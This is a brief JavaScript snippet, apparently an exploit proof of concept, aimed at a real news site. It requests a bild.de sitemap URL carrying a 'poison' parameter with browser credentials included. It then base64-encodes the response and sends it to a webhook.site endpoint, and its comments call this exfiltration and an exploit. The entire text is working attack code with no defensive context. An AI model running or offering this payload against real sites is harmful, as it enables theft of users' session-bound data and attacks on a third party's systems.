fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
  method: "GET",
  credentials: "include"
})
  .then(response => response.text()) // Don't use `.json()` if the response is XML or HTML
  .then(data => {
    // Base64-encode the response to prevent URL issues
    const exfil = btoa(data);

    // Send it to your own server or webhook endpoint
    fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?data=" + encodeURIComponent(exfil));
  })
  .catch(err => console.error("Exploit failed:", err));
